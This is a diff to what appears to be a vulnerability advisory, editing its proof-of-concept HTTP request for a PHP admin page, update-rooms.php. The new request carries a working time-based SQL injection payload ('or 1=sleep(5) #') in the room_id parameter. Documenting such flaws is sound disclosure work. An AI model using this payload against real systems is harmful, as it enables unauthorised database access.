@@ -33,7 +33,7 @@
 ## Proof of Concept
 **HTTP Request Example**
 ``` http request
-GET /admin/update-rooms.php?&room_id=sleep(5) HTTP/1.1
+GET /admin/update-rooms.php?id=1&room_id='+or+1%3dsleep(5)+%23 
 Host: [REDACTED]
 ```
 
